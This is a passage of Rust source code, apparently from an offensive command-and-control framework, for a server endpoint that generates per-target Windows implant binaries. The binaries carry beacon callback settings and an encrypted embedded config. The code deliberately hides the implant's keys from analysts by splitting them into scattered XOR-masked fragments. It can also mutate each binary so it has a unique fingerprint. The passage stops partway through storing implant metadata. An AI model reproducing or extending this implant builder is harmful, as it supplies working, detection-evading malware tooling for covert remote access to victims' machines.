//! Implant generation endpoint — server-side per-implant binary production.
//!
//! `POST /api/generate-implant` takes a JSON spec and returns a patched DLL (or
//! shellcode) with a per-implant X25519 keypair, one-time auth token, and
//! encrypted runtime config embedded in the `.nyx_cfg` PE section.
//!
//! ## Architecture
//!
//! 1. The CI pipeline produces a DLL template with an unpatched `.nyx_cfg`
//!    section (magic `0x41414141`, 1024 bytes of `0xAA`).
//! 2. The server loads this template at startup (`NYX_TEMPLATE`).
//! 3. On generation:
//!    a. Generate a random 32-byte key_seed (never stored directly)
//!    b. Derive implant_priv = HKDF-SHA256(key_seed, "nyx-implant-key-v1",
//!       server_pub) with X25519 clamping
//!    c. Derive implant_pub from implant_priv
//!    d. Derive config_key via ECDH(implant_priv, server_pub) + HKDF
//!       (matching the implant's derive_config_key)
//!    e. Split key_seed into 4 fragments, XOR each with a different
//!       PE-region-derived mask, store scattered in permuted order
//!    f. Encrypt config with config_key, store ciphertext+tag
//!    g. Store implant metadata in DB
//!    h. Return the patched binary
//!
//! ## HKDF-Chain Key Concealment (HKC)
//!
//! The implant's private key is never stored in any form. Instead, a 32-byte
//! key_seed is split into 4 fragments, each XOR-obfuscated with a different
//! mask derived from non-overlapping PE header regions. The fragments are
//! stored in a permuted order determined by a hash of the entry point bytes.
//! At runtime, the implant reverses this to recover the seed, then derives
//! the actual private key via HKDF with X25519 clamping.
//!
//! This makes static key extraction extremely difficult: an analyst must
//! reverse-engineer the fragment mask derivation, the permutation algorithm,
//! AND the HKDF key derivation, then locate 4 scattered fragments and
//! reassemble them in the correct order.

use std::sync::Arc;

use axum::{extract::State, http::StatusCode, Json};
use nyx_mutate::{Mutator, MutationPasses};
use nyx_protocol::wire::Writer;
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::AppState;

/// Feature bit (bit 30 in the `features` u32) that enables binary mutation
/// (NOP insertion, register rotation, key randomization) during implant
/// generation. Set this flag to produce per-implant unique binary fingerprints.
pub const FEATURE_MUTATE: u32 = 0x4000_0000;

// ── HKDF-Chain Key Concealment helpers ─────────────────────────────────────
//
// All functions in this section that derive mask/permutation/seed material
// MUST be byte-for-byte identical to their mirror copies in
// `crates/implant-win/src/config_placeholder.rs`. Any divergence breaks key
// recovery at runtime (AEAD tag mismatch → silent fallback to compile-time
// config). The input *window* is also mirrored: both sides read only the PE
// headers region `0..SizeOfHeaders`, which is byte-identical on disk (file
// layout) and in memory (mapped layout) — PE headers carry no fixups, so the
// two layouts agree there. Reading beyond SizeOfHeaders would diverge because
// file layout has raw section data where the memory layout has zero-fill.

/// Derive an 8-byte XOR mask from the PE headers region, distinguished per
/// fragment by the `region` index.
///
/// All 4 fragments observe the *same* byte window (`data`, the full
/// `0..SizeOfHeaders` slice); the `region` value mixes into the hash so each
/// fragment still gets a distinct 8-byte mask. This avoids the earlier
/// 1024-byte-window split that crossed into file/memory-divergent territory.
///
/// **MUST match the implant-side copy EXACTLY.**
fn derive_fragment_mask(data: &[u8], region: u8) -> [u8; 8] {
    let mut mask = [0u8; 8];
    // Seed the state with the region so each fragment's mask diverges even
    // before any input bytes are consumed. The seed values are spread across
    // the 8 lanes so no two regions produce the same starting state.
    mask[0] = region.wrapping_mul(0x9E).wrapping_add(0x5A);
    mask[1] = region.wrapping_mul(0x37).wrapping_add(0xA5);
    mask[2] = region.rotate_left(3).wrapping_add(0x3C);
    mask[3] = region.rotate_left(5) ^ 0xC3;
    mask[4] = region.wrapping_mul(region).wrapping_add(0x5A);
    mask[5] = region ^ (region.wrapping_mul(0x1F));
    mask[6] = region.rotate_left(2).wrapping_add(0x96);
    mask[7] = region.wrapping_mul(0x6A) ^ 0x69;
    for (j, &b) in data.iter().enumerate() {
        mask[j % 8] = mask[j % 8].wrapping_mul(31).wrapping_add(b);
        mask[(j.wrapping_mul(5).wrapping_add(3)) % 8] ^= b.rotate_left((j % 7) as u32);
    }
    // Second pass: avalanche — each byte absorbs its neighbours
    for _ in 0..4 {
        for i in 0..8 {
            mask[i] = mask[i].wrapping_add(mask[(i + 3) % 8]).rotate_left(3);
        }
    }
    mask
}

/// Fisher-Yates shuffle seeded by an LCG PRNG to produce a deterministic
/// permutation of [0, 1, 2, 3] from a 32-bit seed.
///
/// The permutation determines which fragment slot stores which fragment.
/// **Must match the implant-side copy EXACTLY.**
fn derive_permutation(seed: u32) -> [u8; 4] {
    let mut order = [0u8, 1u8, 2u8, 3u8];
    let mut state = seed;
    // Fisher-Yates with LCG: state = state * 1103515245 + 12345 (glibc rand constants)
    for i in (1..4).rev() {
        state = state.wrapping_mul(1103515245).wrapping_add(12345);
        let j = (state >> 16) as usize % (i + 1);
        order.swap(i, j);
    }
    order
}

/// djb2 hash over raw bytes (no case-folding — used for binary data like
/// entry point machine code, not strings).
fn djb2_raw(data: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in data {
        h = h.wrapping_mul(33).wrapping_add(b as u32);
    }
    h
}

/// Apply X25519 scalar clamping to a 32-byte key.
/// - Clear the low 3 bits of byte 0
/// - Clear the high bit of byte 31
/// - Set the penultimate bit of byte 31
fn clamp_scalar(mut s: [u8; 32]) -> [u8; 32] {
    s[0] &= 0xF8;
    s[31] &= 0x7F;
    s[31] |= 0x40;
    s
}

/// Parse the PE template to find the entry point RVA from the optional header.
fn get_entry_point_rva(template: &[u8]) -> Option<u32> {
    if template.len() < 64 {
        return None;
    }
    let pe_sig_off = u32::from_le_bytes([
        template[0x3C], template[0x3D], template[0x3E], template[0x3F],
    ]) as usize;
    if pe_sig_off + 4 + 20 + 16 + 4 > template.len() {
        return None;
    }
    // COFF header = pe_sig_off + 4
    let coff = pe_sig_off + 4;
    // SizeOfOptionalHeader at COFF offset 16 (u16 LE)
    let opt_size = u16::from_le_bytes([template[coff + 16], template[coff + 17]]) as usize;
    // Optional header = coff + 20
    let opt = coff + 20;
    if opt + 16 + 4 > template.len() || opt_size < 16 + 4 {
        return None;
    }
    let entry_rva = u32::from_le_bytes([
        template[opt + 16],
        template[opt + 17],
        template[opt + 18],
        template[opt + 19],
    ]);
    Some(entry_rva)
}

/// Read the PE `SizeOfHeaders` field (Optional Header +0x3C, u32 LE; same
/// offset for PE32 and PE32+). This is the byte-identical-on-disk-and-in-
/// memory region used for mask derivation. Returns None on any parse error.
///
/// **MUST match the implant-side copy EXACTLY.**
fn get_size_of_headers(template: &[u8]) -> Option<u32> {
    if template.len() < 64 {
        return None;
    }
    let pe_sig_off = u32::from_le_bytes([
        template[0x3C], template[0x3D], template[0x3E], template[0x3F],
    ]) as usize;
    if pe_sig_off + 4 + 20 > template.len() {
        return None;
    }
    let coff = pe_sig_off + 4;
    let opt_size = u16::from_le_bytes([template[coff + 16], template[coff + 17]]) as usize;
    let opt = coff + 20;
    // SizeOfHeaders is at Optional Header +0x3C for both PE32 and PE32+.
    if opt_size < 0x3C + 4 || opt + 0x3C + 4 > template.len() {
        return None;
    }
    Some(u32::from_le_bytes([
        template[opt + 0x3C],
        template[opt + 0x3D],
        template[opt + 0x3E],
        template[opt + 0x3F],
    ]))
}

/// Read the PE `SizeOfImage` field (Optional Header +0x38, u32 LE; same
/// offset for PE32 and PE32+). On the implant side this bounds runtime RVA
/// dereferences; the server uses `rva_to_file_offset`'s None path instead, so
/// no server-side copy is needed here. Returns None on any parse error.
#[allow(dead_code)] // documented for parity; server uses rva_to_file_offset
fn get_size_of_image(template: &[u8]) -> Option<u32> {
    if template.len() < 64 {
        return None;
    }
    let pe_sig_off = u32::from_le_bytes([
        template[0x3C], template[0x3D], template[0x3E], template[0x3F],
    ]) as usize;
    if pe_sig_off + 4 + 20 > template.len() {
        return None;
    }
    let coff = pe_sig_off + 4;
    let opt_size = u16::from_le_bytes([template[coff + 16], template[coff + 17]]) as usize;
    let opt = coff + 20;
    if opt_size < 0x38 + 4 || opt + 0x38 + 4 > template.len() {
        return None;
    }
    Some(u32::from_le_bytes([
        template[opt + 0x38],
        template[opt + 0x39],
        template[opt + 0x3A],
        template[opt + 0x3B],
    ]))
}

/// Convert an RVA to a file offset by walking the section headers.
/// Returns the file offset of the first byte at that RVA, or None if the RVA
/// falls outside all sections.
fn rva_to_file_offset(template: &[u8], rva: u32) -> Option<usize> {
    if template.len() < 64 {
        return None;
    }
    let pe_sig_off = u32::from_le_bytes([
        template[0x3C], template[0x3D], template[0x3E], template[0x3F],
    ]) as usize;
    if pe_sig_off + 4 + 20 > template.len() {
        return None;
    }
    let coff = pe_sig_off + 4;
    let num_sections = u16::from_le_bytes([template[coff + 2], template[coff + 3]]) as usize;
    let opt_size = u16::from_le_bytes([template[coff + 16], template[coff + 17]]) as usize;
    let sections_start = coff + 20 + opt_size;
    const SECTION_SIZE: usize = 40;

    for i in 0..num_sections {
        let sh = sections_start + i * SECTION_SIZE;
        if sh + 40 > template.len() {
            break;
        }
        let virt_addr = u32::from_le_bytes([
            template[sh + 12], template[sh + 13], template[sh + 14], template[sh + 15],
        ]);
        let virt_size = u32::from_le_bytes([
            template[sh + 8], template[sh + 9], template[sh + 10], template[sh + 11],
        ]);
        let raw_offset = u32::from_le_bytes([
            template[sh + 20], template[sh + 21], template[sh + 22], template[sh + 23],
        ]);
        let raw_size = u32::from_le_bytes([
            template[sh + 16], template[sh + 17], template[sh + 18], template[sh + 19],
        ]);

        if rva >= virt_addr && rva < virt_addr + virt_size.max(raw_size) {
            let offset_in_section = (rva - virt_addr) as usize;
            let file_offset = raw_offset as usize + offset_in_section;
            if file_offset < template.len() {
                return Some(file_offset);
            }
        }
    }
    None
}

/// Read 16 bytes from the entry point in the template file, converting the
/// entry point RVA to a file offset via section headers.
fn read_entry_point_bytes(template: &[u8], entry_rva: u32) -> Option<[u8; 16]> {
    let file_offset = rva_to_file_offset(template, entry_rva)?;
    if file_offset + 16 > template.len() {
        return None;
    }
    let mut buf = [0u8; 16];
    buf.copy_from_slice(&template[file_offset..file_offset + 16]);
    Some(buf)
}

/// Derive the per-implant config encryption key identically to the implant:
///
///   implant_pub = X25519(implant_priv)
///   shared = ECDH(implant_priv, server_pub)
///   config_key = HKDF-SHA256(shared, "nyx-implant-config-v1",
///                            server_pub || implant_pub)
///
/// This MUST match `derive_config_key` in
/// `crates/implant-win/src/config_placeholder.rs`.
fn derive_config_key_server(
    implant_priv: &[u8; 32],
    server_pub: &[u8; 32],
) -> Option<[u8; 32]> {
    let implant_pub = nyx_protocol::crypto::public_from_secret(implant_priv)?;
    let shared = nyx_protocol::crypto::ecdh(implant_priv, server_pub)?;
    let mut info = [0u8; 64];
    info[..32].copy_from_slice(server_pub);
    info[32..].copy_from_slice(&implant_pub);
    let mut okm = [0u8; 32];
    nyx_protocol::crypto::hkdf_sha256(&shared, b"nyx-implant-config-v1", &info, &mut okm);
    Some(okm)
}

// ── PE validation ─────────────────────────────────────────────────────────

/// Validate a PE template at load time: MZ magic, PE signature at offset 0x3C,
/// minimum 4096 bytes. This is a startup-time sanity check — it guards against
/// corrupted/truncated files but does not parse the full NT header.
pub fn validate_template_pe(bytes: &[u8]) -> Result<(), String> {
    if bytes.len() < 4096 {
        return Err("template too small (min 4096 bytes)".to_string());
    }
    // MZ magic
    if bytes[0] != 0x4D || bytes[1] != 0x5A {
        return Err("missing MZ magic".to_string());
    }
    // PE signature pointer at offset 0x3C (little-endian u32)
    let pe_sig_off =
        u32::from_le_bytes([bytes[0x3C], bytes[0x3D], bytes[0x3E], bytes[0x3F]]) as usize;
    if pe_sig_off + 4 > bytes.len() {
        return Err("PE signature offset out of bounds".to_string());
    }
    if bytes[pe_sig_off] != 0x50
        || bytes[pe_sig_off + 1] != 0x45
        || bytes[pe_sig_off + 2] != 0x00
        || bytes[pe_sig_off + 3] != 0x00
    {
        return Err("missing PE\\0\\0 signature".to_string());
    }
    Ok(())
}

/// Validate a patched PE binary at generation time. Checks MZ, PE sig,
/// `.nyx_cfg` section magic (0xDEADBEEF), and section bounds so a malformed
/// implant is caught before it is stored or returned to the operator.
fn validate_patched_pe(binary: &[u8], cfg_offset: usize) -> Result<(), String> {
    if binary.len() < 4096 {
        return Err("patched binary too small".to_string());
    }
    if binary[0] != 0x4D || binary[1] != 0x5A {
        return Err("missing MZ magic in patched binary".to_string());
    }
    let pe_sig_off =
        u32::from_le_bytes([binary[0x3C], binary[0x3D], binary[0x3E], binary[0x3F]]) as usize;
    if pe_sig_off + 4 > binary.len() {
        return Err("PE signature offset out of bounds in patched binary".to_string());
    }
    if binary[pe_sig_off] != 0x50
        || binary[pe_sig_off + 1] != 0x45
        || binary[pe_sig_off + 2] != 0x00
        || binary[pe_sig_off + 3] != 0x00
    {
        return Err("missing PE\\0\\0 signature in patched binary".to_string());
    }
    // .nyx_cfg section magic at cfg_offset
    if cfg_offset + 6 > binary.len() {
        return Err("cfg_offset out of bounds in patched binary".to_string());
    }
    let magic = u32::from_le_bytes([
        binary[cfg_offset],
        binary[cfg_offset + 1],
        binary[cfg_offset + 2],
        binary[cfg_offset + 3],
    ]);
    if magic != 0xDEADBEEF {
        return Err(format!(
            "bad .nyx_cfg magic at offset {cfg_offset}: expected 0xDEADBEEF, got 0x{magic:08X}"
        ));
    }
    // Validate data_len fits within the 1024-byte section
    let data_len = u16::from_le_bytes([binary[cfg_offset + 4], binary[cfg_offset + 5]]) as usize;
    if data_len > 900 {
        return Err(format!("data_len too large: {data_len} (max 900)"));
    }
    if cfg_offset + 1024 > binary.len() {
        return Err(".nyx_cfg section extends past EOF in patched binary".to_string());
    }
    // Config data must fit: ct+tag starts at cfg_offset+54 (4 magic + 4 keying
    // + 2 dlen + 12 nonce + 32 fragments = 54), end = cfg_offset+54+data_len.
    if cfg_offset + 54 + data_len > cfg_offset + 1024 {
        return Err("encrypted config data overflows .nyx_cfg section".to_string());
    }
    Ok(())
}

// ── Rate limiting ──────────────────────────────────────────────────────────

/// Maximum implant generation requests per sliding window.
const DEFAULT_RATE_LIMIT_MAX: usize = 10;
/// Sliding window duration in seconds (1 hour).
const DEFAULT_RATE_LIMIT_WINDOW_SECS: u64 = 3600;

// ── Request / Response types ────────────────────────────────────────────────

/// Request body for `POST /api/generate-implant`.
#[derive(Debug, Deserialize)]
pub struct GenerateRequest {
    /// Callback host (IP or hostname). Required.
    pub callback: String,
    /// Callback port. Defaults to 8443.
    #[serde(default = "default_port")]
    pub port: u16,
    /// Output format: "dll" (default), "shellcode", "exe".
    #[serde(default = "default_format")]
    pub format: String,
    /// Beacon URI path (e.g., "/beacon"). Defaults to "/beacon".
    #[serde(default = "default_uri")]
    pub uri: String,
    /// Sleep interval in seconds between beacon cycles. Default 60.
    #[serde(default = "default_sleep")]
    pub sleep: u32,
    /// Jitter percentage (0-100). Default 20.
    #[serde(default = "default_jitter")]
    pub jitter: u8,
    /// Use TLS for beacon transport. Default true.
    #[serde(default = "default_tls")]
    pub tls: bool,
    /// Features bitmap. See the architecture doc for bit definitions.
    #[serde(default)]
    pub features: u32,
    /// Number of HKDF environment keying layers (0 = off). Phase 3.
    #[serde(default)]
    pub keying: u32,
    /// ISO 8601 expiry timestamp, or empty = no expiry.
    #[serde(default)]
    pub expires: Option<String>,
    /// Operator notes.
    #[serde(default)]
    pub notes: Option<String>,
    /// Delivery mode: `"inline"` returns the patched binary as base64 in the
    /// JSON response body (`binary` field). Omit or set to any other value to
    /// skip inline delivery (metadata only).
    #[serde(default)]
    pub deliver: Option<String>,
}

fn default_port() -> u16 {
    8443
}
fn default_format() -> String {
    "dll".into()
}
fn default_uri() -> String {
    "/beacon".into()
}
fn default_sleep() -> u32 {
    60
}
fn default_jitter() -> u8 {
    20
}
fn default_tls() -> bool {
    true
}

#[derive(Debug, Serialize)]
pub struct GenerateResponse {
    pub ok: bool,
    /// Hex-encoded X25519 public key of the new implant.
    pub implant_pub: String,
    /// Hex-encoded SHA-256 of the output binary.
    pub sha256: String,
    /// Size of the output binary in bytes.
    pub size_bytes: usize,
    /// The output format.
    pub format: String,
    /// Human-readable message.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
    /// Base64-encoded patched binary (DLL/shellcode/exe). Present when the
    /// operator requests inline delivery via `"deliver": "inline"` in the
    /// request body; omitted otherwise (use the download endpoint).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub binary: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct ImplantListResponse {
    pub ok: bool,
    pub implants: Vec<ImplantSummary>,
}

#[derive(Debug, Serialize)]
pub struct ImplantSummary {
    pub id: i64,
    pub implant_pub: String,
    pub auth_token_used: bool,
    pub created_at: String,
    pub callback_host: String,
    pub callback_port: u16,
    pub format: String,
    pub revoked: bool,
    pub expires_at: Option<String>,
}

// ── Handler ─────────────────────────────────────────────────────────────────

/// `POST /api/generate-implant`
///
/// Requires a loaded DLL template (`NYX_TEMPLATE`) and an open implant store.
/// Authenticated via the standard control-API bearer token (checked by the
/// auth middleware layer).
pub async fn generate_implant(
    State(st): State<Arc<AppState>>,
    Json(req): Json<GenerateRequest>,
) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
    let template = st
        .template
        .as_ref()
        .ok_or_else(|| {
            (
                StatusCode::SERVICE_UNAVAILABLE,
                "implant generation disabled: no DLL template loaded (set NYX_TEMPLATE)".into(),
            )
        })?;

    let implant_store = st
        .implants
        .as_ref()
        .ok_or_else(|| {
            (
                StatusCode::SERVICE_UNAVAILABLE,
                "implant generation disabled: no implant store".into(),
            )
        })?;

    // Validate inputs.
    if req.callback.is_empty() || req.callback.len() > 255 {
        return Err((
            StatusCode::BAD_REQUEST,
            "callback host must be 1-255 characters".into(),
        ));
    }
    if req.jitter > 100 {
        return Err((
            StatusCode::BAD_REQUEST,
            "jitter must be 0-100".into(),
        ));
    }
    if !matches!(req.format.as_str(), "dll" | "shellcode" | "exe") {
        return Err((
            StatusCode::BAD_REQUEST,
            "format must be 'dll', 'shellcode', or 'exe'".into(),
        ));
    }
    if req.sleep == 0 {
        return Err((
            StatusCode::BAD_REQUEST,
            "sleep must be > 0 (no-interval beacon is an IOC)".into(),
        ));
    }
    // env-keying (Phase 3) is a runtime-only lock: the implant mixes the
    // target machine's username/Machine-SID/MAC/GetTickCount64 into the
    // config key at decryption time. The server cannot mirror any of these
    // (the Temporal layer is a transient tick count the server can never
    // know at generation time), so a non-zero `keying` would produce an
    // implant that can never decrypt its own config — a dead beacon. Reject
    // hard rather than ship a guaranteed-broken implant. See
    // `crates/implant-win/src/env_keying.rs` for the layer semantics.
    if req.keying != 0 {
        return Err((
            StatusCode::BAD_REQUEST,
            "env-keying (keying != 0) is a runtime-only lock and cannot be \
             enabled at generation time: the server cannot mirror the target's \
             runtime username/SID/MAC/tick-count. Omit `keying` or set it to 0."
                .into(),
        ));
    }

    // Rate limiting: sliding window per (callback, port) pair. Prevents
    // enumeration/spray against a single target by capping generation to
    // DEFAULT_RATE_LIMIT_MAX requests per DEFAULT_RATE_LIMIT_WINDOW_SECS.
    {
        use std::time::Instant;
        let key = format!("{}:{}", req.callback, req.port);
        let mut entry = st.implant_rate_limiter.entry(key).or_default();
        let now = Instant::now();
        let window = std::time::Duration::from_secs(DEFAULT_RATE_LIMIT_WINDOW_SECS);
        entry.retain(|t| now.duration_since(*t) < window);
        if entry.len() >= DEFAULT_RATE_LIMIT_MAX {
            return Err((
                StatusCode::TOO_MANY_REQUESTS,
                format!(
                    "rate limit exceeded: max {} implants per hour per target",
                    DEFAULT_RATE_LIMIT_MAX
                ),
            ));
        }
        entry.push(now);
    }

    // 1. Generate per-implant secrets.
    //    key_seed: 32 random bytes, NEVER stored directly. Split into 4
    //              fragments, XOR-obfuscated, and scattered across .nyx_cfg.
    //    auth_token: one-time first-check-in token (stored in encrypted config).
    //    config_nonce: 12-byte nonce for ChaCha20-Poly1305 config AEAD.
    let mut key_seed = [0u8; 32];
    let mut auth_token = [0u8; 32];
    let mut config_nonce = [0u8; 12];
    rand::rngs::OsRng.fill_bytes(&mut key_seed);
    rand::rngs::OsRng.fill_bytes(&mut auth_token);
    rand::rngs::OsRng.fill_bytes(&mut config_nonce);

    // Get the server's long-term public key for HKDF derivation.
    let server_pub = st.keypair.public_bytes();

    // Derive implant_priv from key_seed via HKDF-SHA256 with X25519 clamping.
    let mut implant_priv_derived = [0u8; 32];
    nyx_protocol::crypto::hkdf_sha256(
        &key_seed,
        b"nyx-implant-key-v1",
        &server_pub,
        &mut implant_priv_derived,
    );
    let implant_priv = clamp_scalar(implant_priv_derived);
    // Defense in depth: zero the unclamped intermediate. The compiler
    // warns about dead-store since Copy semantics already made a clone
    // for clamp_scalar and we never read the original again — it's fine.
    {
        #[allow(unused_assignments)]
        {
            implant_priv_derived = [0u8; 32];
        }
    }

    // Derive implant public key from the clamped private key.
    let implant_pub = nyx_protocol::crypto::public_from_secret(&implant_priv)
        .ok_or_else(|| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "failed to derive implant public key".into(),
            )
        })?;

    // Derive config_key via ECDH(implant_priv, server_pub) + HKDF, matching
    // the implant's derive_config_key exactly.
    let config_key = derive_config_key_server(&implant_priv, &server_pub)
        .ok_or_else(|| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "failed to derive config encryption key".into(),
            )
        })?;

    // 2. Build config plaintext.
    // Layout: str(callback) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
    //        | u8(has_token=1) | blob(auth_token 32B)
    //        | u32(features) | u32(keying) | u64(expires_at)
    let mut pw = Writer::new();
    pw.str(&req.callback).map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    pw.u16(req.port);
    pw.str(&req.uri).map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    pw.u32(req.sleep);
    pw.u8(req.jitter);
    pw.u8(if req.tls { 1 } else { 0 });
    // auth_token: always present for server-generated implants
    pw.u8(1);
    pw.blob(&auth_token).map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    pw.u32(req.features);
    pw.u32(req.keying);
    let expires_ts: u64 = req
        .expires
        .as_ref()
        .and_then(|s| {
            // Parse ISO 8601 timestamp or fall back to 0.
            // Simple parse: expect YYYY-MM-DDTHH:MM:SSZ or similar.
            s.parse::<i64>().ok().map(|v| v as u64)
        })
        .unwrap_or(0);
    pw.u64(expires_ts);
    let config_plaintext = pw.into_bytes();

    // 3. Encrypt config with ChaCha20-Poly1305.
    let ct_with_tag = {
        use chacha20poly1305::aead::{Aead, KeyInit, Payload};
        use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};
        let cipher = ChaCha20Poly1305::new(Key::from_slice(&config_key));
        let nonce = Nonce::from_slice(&config_nonce);
        cipher
            .encrypt(nonce, Payload { msg: &config_plaintext, aad: b"" })
            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("encrypt failed: {e}")))?
    };
    // ct_with_tag = ciphertext || 16B Poly1305 tag

    // 4. Patch the DLL template.
    let mut binary = (**template).clone();

    // Sanity-check the config ciphertext size before we touch the binary.
    // (The .nyx_cfg placeholder is located *after* mutation, since mutation
    // can shift its offset.)
    let data_len = ct_with_tag.len();
    if data_len > 900 {
        return Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("config data too large: {data_len} bytes (max 900)"),
        ));
    }

    // 4a. Apply binary mutation FIRST (before patching the .nyx_cfg section).
    //
    // The mask/fragment-permutation derivation MUST run against the *final*
    // bytes the implant sees at runtime. If we mutated after patching, the
    // masks (derived from the pre-mutation header) would not match the
    // post-mutation header the implant reads — key recovery would silently
    // fail. Mutating the unpatched template first means the mutator's
    // `randomize_keys` pass sees the placeholder (`0x41414141`, not the
    // `0xDEADBEEF` it looks for) and leaves that region untouched, so the
    // placeholder survives to be re-located and patched below.
    let mutation_report = if req.features & FEATURE_MUTATE != 0 {
        // Use the implant's private key bytes as the mutation seed for
        // deterministic, per-implant-unique mutation that is reproducible
        // from the audit log.
        let seed = u64::from_le_bytes([
            implant_priv[0],
            implant_priv[1],
            implant_priv[2],
            implant_priv[3],
            implant_priv[4],
            implant_priv[5],
            implant_priv[6],
            implant_priv[7],
        ]);
        let mutator = Mutator::new(seed);
        let passes = MutationPasses {
            nops: true,
            registers: true,
            keys: true,
        };
        let report = mutator.mutate(&mut binary, passes);
        tracing::info!(
            implant_pub = %hex::encode(implant_pub),
            nops = report.nops_inserted,
            regs = report.registers_swapped,
            keys = report.keys_randomized,
            "binary mutation applied"
        );
        Some(report)
    } else {
        None
    };

    // 4b. Re-locate the .nyx_cfg placeholder. Mutation (NOP insertion) may
    // have shifted its offset, so we cannot reuse the pre-mutation value.
    let placeholder_offset = binary
        .windows(8)
        .position(|w| {
            w[0] == 0x41 && w[1] == 0x41 && w[2] == 0x41 && w[3] == 0x41
                && w[4] == 0xAA && w[5] == 0xAA
        })
        .ok_or_else(|| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "mutated DLL has no .nyx_cfg placeholder (0x41414141 + 0xAA) \
                 — mutation likely corrupted it"
                    .into(),
            )
        })?;
    if placeholder_offset + 1024 > binary.len() {
        return Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            "DLL template .nyx_cfg placeholder extends past EOF".into(),
        ));
    }

    // 4c. Derive XOR masks and fragment permutation from the FINAL binary's
    // PE headers region (`0..SizeOfHeaders`). This is the byte range that is
    // identical on disk and in the implant's memory map, so both sides
    // compute the same masks and permutation.
    //
    // Borrows are ordered: compute everything we need from the immutable
    // `binary` before taking `&mut section`.
    let (fragment_masks, fragment_order) = {
        let soh = get_size_of_headers(&binary)
            .map(|v| (v as usize).min(4096))
            .unwrap_or(0);
        // Fall back to a minimal slice if SizeOfHeaders is unparseable —
        // both sides handle 0-length input identically (region seed alone
        // determines the mask). An unparseable header on a real template is
        // a template-build bug; the validate_template call at startup should
        // have caught it.
        let header = if soh > 0 { &binary[..soh] } else { &binary[..0] };
        let mask0 = derive_fragment_mask(header, 0);
        let mask1 = derive_fragment_mask(header, 1);
        let mask2 = derive_fragment_mask(header, 2);
        let mask3 = derive_fragment_mask(header, 3);

        // Permutation seed: hash the entry point's first 16 bytes when the
        // RVA is valid and readable; otherwise hash the same header window
        // (so both fallback paths use the identical byte slice as the mask
        // derivation, keeping the two sides in lockstep).
        let entry_rva = get_entry_point_rva(&binary).unwrap_or(0);
        let order_seed = if entry_rva != 0 {
            if let Some(ep_bytes) = read_entry_point_bytes(&binary, entry_rva) {
                djb2_raw(&ep_bytes)
            } else {
                djb2_raw(header)
            }
        } else {
            djb2_raw(header)
        };
        let order = derive_permutation(order_seed);

        ([mask0, mask1, mask2, mask3], order)
    };

    // Split key_seed into 4 fragments of 8 bytes each.
    let fragments: [[u8; 8]; 4] = [
        key_seed[0..8].try_into().unwrap(),
        key_seed[8..16].try_into().unwrap(),
        key_seed[16..24].try_into().unwrap(),
        key_seed[24..32].try_into().unwrap(),
    ];

    // XOR each fragment with its region-specific mask.
    let mut obfuscated: [[u8; 8]; 4] = fragments;
    for i in 0..4 {
        for j in 0..8 {
            obfuscated[i][j] ^= fragment_masks[i][j];
        }
    }

    // Write the patched section.
    let section = &mut binary[placeholder_offset..placeholder_offset + 1024];

    // New layout (HKDF-Chain Key Concealment):
    // [0xDEADBEEF magic 4B] [keying_levels u32 LE 4B] [data_len u16 LE 2B]
    // [config_nonce 12B] [fragment area 32B — 4×8B permuted] [ct+tag N+16B]
    // Total header before ct: 4 + 4 + 2 + 12 + 32 = 54 bytes
    //
    // Fragment storage: fragment i (i=0..3) is stored at offset
    //   22 + fragment_order[i] * 8
    // obfuscated with mask i. The permutation `fragment_order` is a
    // shuffled [0,1,2,3] — it determines physical slot → logical index.
    // On recovery, the implant computes the same permutation, reads
    // fragment_order[i] from slot i, un-XORs with mask[fragment_order[i]],
    // and assembles key_seed in logical order.

    section[0] = 0xEF;
    section[1] = 0xBE;
    section[2] = 0xAD;
    section[3] = 0xDE;
    // keying_levels (u32 LE at bytes 4-7)
    section[4] = (req.keying) as u8;
    section[5] = ((req.keying) >> 8) as u8;
    section[6] = ((req.keying) >> 16) as u8;
    section[7] = ((req.keying) >> 24) as u8;
    // data_len (u16 LE at bytes 8-9)
    section[8] = (data_len as u16) as u8;
    section[9] = ((data_len as u16) >> 8) as u8;
    // Config nonce (12B at bytes 10-21)
    section[10..22].copy_from_slice(&config_nonce);

    // Fragment slots: 4 slots of 8 bytes each, starting at offset 22.
    // Slot position k (k=0..3) holds fragment fragment_order[k],
    // obfuscated with mask[fragment_order[k]].
    for slot in 0..4 {
        let frag_idx = fragment_order[slot] as usize;
        let pos = 22 + slot * 8;
        section[pos..pos + 8].copy_from_slice(&obfuscated[frag_idx]);
    }

    // Encrypted config + tag at byte 54
    section[54..54 + data_len].copy_from_slice(&ct_with_tag);
    // Zero-pad the rest
    for b in &mut section[54 + data_len..] {
        *b = 0;
    }

    // Validate the patched PE before computing SHA-256 and storing. Catches a
    // malformed implant (bad magic, section overflow) at generation time rather
    // than letting the operator download a corrupted binary.
    validate_patched_pe(&binary, placeholder_offset).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("PE validation failed after patching: {e}"),
        )
    })?;

    // 5. Compute SHA-256 of the output.
    let mut hasher = Sha256::new();
    hasher.update(binary.as_slice());
    let sha256 = hex::encode(hasher.finalize());

    // 6. Store implant metadata.
    let mut token_hasher = Sha256::new();
    token_hasher.update(auth_token);
    let token_hash = hex::encode(token_hasher.finalize());

    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs().to_string())
        .unwrap_or_else(|_| "0".to_string());
    let record = nyx_store::ImplantRecord {
        id: 0, // auto-incremented
        implant_pub: hex::encode(implant_pub),
        auth_token_hash: token_hash,
        auth_token_used: false,
        created_at: now.clone(),
